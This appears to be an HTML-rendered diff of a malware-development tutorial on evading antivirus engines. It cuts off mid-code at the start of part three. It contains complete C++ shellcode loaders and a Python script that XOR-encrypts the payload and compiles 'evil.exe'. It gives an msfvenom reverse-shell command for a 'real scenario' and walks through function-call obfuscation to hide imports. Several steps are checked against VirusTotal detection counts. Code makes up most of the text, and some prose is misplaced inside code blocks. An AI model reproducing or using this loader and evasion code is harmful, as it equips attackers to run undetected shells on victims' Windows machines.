+(LPTHREAD_START_ROUTINE) my_payload_mem,
+0, 0, 0);
+WaitForSingleObject(th, -1);
+}
+return 0;
+}
+The main difference with our first simple implementation is - we add XOR decrypt
+function and our secret key my_secret_key for decryption:
+
+It’s actually simple function, it’s a symmetric encryption, we can use it for encryption
+and decryption with the same key.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and we deXOR our payload before copy to buffer:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And the only missing thing is our payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">which should be encrypted with XOR. For that create simple python script which encrypt payload and replace it in our C++ template:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>x64 Assembly</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-nasm">import sys
+import os
+import hashlib
+import string
+## XOR function to encrypt data
+def xor(data, key):
+key = str(key)
+l = len(key)
+output_str = ""
+for i in range(len(data)):
+current = data[i]
+current_key = key[i % len(key)]
+ordd = lambda x: x if isinstance(x, int) else ord(x)
+output_str += chr(ordd(current) ^ ord(current_key))
+return output_str
+## encrypting
+def xor_encrypt(data, key):
+ciphertext = xor(data, key)
+ciphertext = '{ 0x' + ', 0x'.
+join(hex(ord(x))[2:] for x in ciphertext) + ' };'
+print (ciphertext)
+return ciphertext, key
+## key for encrypt/decrypt
+
+my_secret_key = "mysupersecretkey"
+## payload calc.exe
+plaintext = open("./calc.bin", "rb").read()
+ciphertext, p_key = xor_encrypt(plaintext, my_secret_key)
+## open and replace our payload in C++ code
+tmp = open("evil_xor.cpp", "rt")
+data = tmp.read()
+data = data.replace('unsigned char my_payload[] = { };',
+'unsigned char my_payload[] = ' + ciphertext)
+tmp.close()
+tmp = open("evil-enc.cpp", "w+")
+tmp.write(data)
+tmp.close()
+## compile
+try:
+cmd = "x86_64-w64-mingw32-gcc evil-enc.cpp"
+cmd += "-o evil.exe -s -ffunction-sections"
+cmd += "-fdata-sections -Wno-write-strings"
+cmd += " -fno-exceptions -fmerge-all-constants"
+cmd += "-static-libstdc++ -static-libgcc"
+cmd += " &gt;/dev/null 2&gt;&amp;1"
+os.system(cmd)
+except:
+print ("error compiling malware template :(")
+sys.exit()
+else:
+print (cmd)
+print ("successfully compiled :)")</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For simplicity, we use calc.bin payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">but in real scenario you can use something like:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp \</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">LHOST=10.9.1.6 LPORT=4444 -f raw -o hack.bin</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">run python script:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">python3 evil_enc.py</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and run in victim’s machine (Windows 10 x64):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload our new evil.exe with encrypted payload to Virustotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e980 8efbfaf7989e1e15fd9587ca/detection So, we have reduced the number of AV engines which detect our malware from 22 to 18! Source code in Github</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>RtlMoveMemory</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualProtect</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>WaitForSingleObject</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateThread</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>XOR</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the next part, I will write how else you can reduce the number of detections using function call obfuscation technique.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">AV engines evasion for C++ simple malware - part 2</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is the second part of the tutorial, firstly, I recommend that you study the first part. In this section we will study function call obfuscation. So what is this? Why malware developers and red teamers need to learn it? Let’s consider our evil.exe from part 1 in virustotal: https://www.virustotal.com/gui/file/c7393080957780bb88f7ab1fa2d19bdd1d99e980 8efbfaf7989e1e15fd9587ca/detection and go to the details tab:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Every PE module like .exe and .dll usually uses external functions. So when it is</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">running, it will call every functions implemented in an external DLLs which will be mapped into a process memory to make this functions available to the process code. AV industry analyze most kind of external DLLs and functions are used by the malware. It can be a good indicator if this binary is malicious or not. So AV engine analyzes a PE file on disk by looking the into its import address. Of course this method is not bullet proof and can generate some false positives but it is a known to work in some cases and is widely used by AV engines. So what we as a malware developers can do about it? This is where function call obfuscation comes into play. Function Call Obfuscation is a method of hiding your DLLs and external functions that will be called a during runtime. To do that we can use standard Windows API functions called <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandle</code> and <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code>. The former returns a handled a specifiied DLL and later allows you to get a memory address of the function you need and which is exported from that DLL. So let me give you an example. So let’s say your program needs to call a function called HackAndWin which is exported in a DLL named hacker.dll. So first you call <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandle</code>, and then you can call <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> with an argument of HackAndWin function and in return you get in address of that function: hack = <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code>( <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandle</code>("hacker.dll"), "HackAndWin"); So what is important here? Is that if you compile your code, compiler will not include hacker.dll into import address table. So AV engine will not be able to see that during static analysis. Let’s see how we can practically use this technique. Let’s take a look at the source coude of our first malware from part 1:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+cpp implementation malware
+example with calc.exe payload
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+// our payload calc.exe
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int my_payload_len = sizeof(my_payload);
+int main(void) {
+void * my_payload_mem; // memory buffer for payload
+BOOL rv;
+HANDLE th;
+DWORD oldprotect = 0;
+// Allocate a memory buffer for payload
+my_payload_mem = VirtualAlloc(0, my_payload_len,
+MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+// copy payload to buffer
+RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
+// make new buffer as executable
+rv = VirtualProtect(my_payload_mem, my_payload_len,
+PAGE_EXECUTE_READ, &amp;oldprotect);
+if ( rv != 0 ) {
+// run payload
+th = CreateThread(0, 0,
+(LPTHREAD_START_ROUTINE) my_payload_mem,
+0, 0, 0);
+
+WaitForSingleObject(th, -1);
+}
+return 0;
+}
+So this code contains very basic logic for executing payload. So in this case, for simplicity,
+it’s not encrypted payload, it’s plain payload.
+
+Let’s compile it:
+
+and run to make sure that it works:</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So let’s take a look into import address table. objdump -x -D evil.exe | less</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and as you can see our program is uses KERNEL32.dll and import all this functions:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and some of them are used in our code:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So let’s get read of <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code>. So how we can do that? First of all we need to find a declaration <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and just a make sure that it is implemented in a Kernel32.dll:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So let’s create a global variable called <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code>, but it has to be a pointer pVirtualAlloc this variable will store the address to <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And now we need to get this address via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code>, and we need to change the call <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> to pVirtualAlloc:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then let’s go to compile it. And see again import address table: objdump -x -D evil.exe | less</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So no <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> in import address table. Looks good. But, there is a caveat. When we try to extract all the strings from the our binary we will see that <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> string is still there. Let’s do it. run: strings -n 8 evil.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">as you can see it is here. The reason is that we are using the stream in cleartext when we are calling <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code>. So what we can do about it? The way is we can remove that. We can used XOR function for encrypt/decrypt, we used before, so let’s do that. Firstly, add XOR function to our evil.cpp malware source code:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For that we will need encryption key and some string. cVirtualAlloc and modify our code:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">add XOR decryption:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And let’s say string as</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, the final version of our malware code is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>x64 Assembly</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-nasm">/*
+cpp implementation malware
+example with calc.exe payload
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+// our payload calc.exe
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int my_payload_len = sizeof(my_payload);
+// XOR encrypted VirtualAlloc
+unsigned char cVirtualAlloc[] = { };
+
+unsigned int cVirtualAllocLen = sizeof(cVirtualAlloc);
+// encrypt/decrypt key
+char mySecretKey[] = "meowmeow";
+// LPVOID VirtualAlloc(
+//
+LPVOID lpAddress,
+//
+SIZE_T dwSize,
+//
+DWORD flAllocationType,
+//
+DWORD flProtect
+// );
+LPVOID (WINAPI * pVirtualAlloc)(
+LPVOID lpAddress,
+SIZE_T dwSize,
+DWORD flAllocationType,
+DWORD flProtect
+);
+void XOR(char * data, size_t data_len, char * key,
+size_t key_len) {
+int j;
+j = 0;
+for (int i = 0; i &lt; data_len; i++) {
+if (j == key_len - 1) j = 0;
+data[i] = data[i] ^ key[j];
+j++;
+}
+}
+int main(void) {
+void * my_payload_mem; // memory buffer for payload
+BOOL rv;
+HANDLE th;
+DWORD oldprotect = 0;
+XOR((char *) cVirtualAlloc, cVirtualAllocLen,
+mySecretKey, sizeof(mySecretKey));
+// Allocate a memory buffer for payload
+pVirtualAlloc = GetProcAddress(
+GetModuleHandle("kernel32.dll"), cVirtualAlloc);
+my_payload_mem = pVirtualAlloc(0, my_payload_len,
+MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+// copy payload to buffer
+RtlMoveMemory(my_payload_mem, my_payload,
+my_payload_len);
+// make new buffer as executable
+rv = VirtualProtect(my_payload_mem, my_payload_len,
+PAGE_EXECUTE_READ, &amp;oldprotect);
+if ( rv != 0 ) {
+// run payload
+th = CreateThread(0, 0,
+(LPTHREAD_START_ROUTINE) my_payload_mem,
+0, 0, 0);
+WaitForSingleObject(th, -1);
+}
+return 0;
+}
+And use python script to XOR encrypt our function name and replace:
+import sys
+import os
+import hashlib
+import string
+## XOR function to encrypt data
+def xor(data, key):
+key = str(key)
+l = len(key)
+output_str = ""
+for i in range(len(data)):
+current = data[i]
+current_key = key[i % len(key)]
+ordd = lambda x: x if isinstance(x, int) else ord(x)
+output_str += chr(ordd(current) ^ ord(current_key))
+return output_str
+## encrypting
+def xor_encrypt(data, key):
+ciphertext = xor(data, key)
+ciphertext = '{ 0x' + ', 0x'.
+join(hex(ord(x))[2:] for x in ciphertext) + ' };'
+print (ciphertext)
+return ciphertext, key
+## key for encrypt/decrypt
+
+plaintext = "VirtualAlloc"
+my_secret_key = "meowmeow"
+## encrypt VirtualAlloc
+ciphertext, p_key = xor_encrypt(plaintext, my_secret_key)
+## open and replace our payload in C++ code
+tmp = open("evil.cpp", "rt")
+data = tmp.read()
+data = data.replace('unsigned char cVirtualAlloc[] = { };',
+'unsigned char cVirtualAlloc[] = ' + ciphertext)
+tmp.close()
+tmp = open("evil-enc.cpp", "w+")
+tmp.write(data)
+tmp.close()
+## compile
+try:
+cmd = "x86_64-w64-mingw32-gcc evil-enc.cpp"
+cmd += " -o evil.exe -s -ffunction-sections"
+cmd += " -fdata-sections -Wno-write-strings"
+cmd += " -fno-exceptions -fmerge-all-constants"
+cmd += " -static-libstdc++ -static-libgcc"
+cmd += " &gt;/dev/null 2&gt;&amp;1"
+os.system(cmd)
+except:
+print ("error compiling malware template :(")
+sys.exit()
+else:
+print (cmd)
+print ("successfully compiled :)")
+Compile and check.
+strings -n 8 evil.exe | grep "Virtual"
+
+and as you can see no VirtualAlloc in strings check. This is how you can actually
+obfuscate any function in your code. It can be VirtualProtect or RtlMoveMemory,
+etc.
+run:
+
+everything is ok.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to upload our evil.exe to virustotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">https://www.virustotal.com/gui/file/bf21d0af617f1bad81ea178963d70602340d8514 5b96aba330018259bd02fe56/detection So, 22 of of 66 AV engines detect our file as malicious. Other functions can be obfuscated to reduce the number of AV engines that detect our malware. For better result we can combine payload encryption with random key and obfuscate functions with another keys etc. Source code in Github</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>RtlMoveMemory</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualProtect</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>WaitForSingleObject</span></div></div>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateThread</code></span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>XOR</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As a result of my research, my project peekaboo appeared. Simple undetectable shellcode and code injector launcher example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">56. AV engines evasion techniques - part 3. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This is a third part of the tutorial and it describes an example how to bypass AV engines in simple C++ malware. first part second part In this section we will try to implement some techniques used by malicious software to execute code, hide from defenses. Let’s take a look at example C++ source code of our malware which implement classic code injection:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
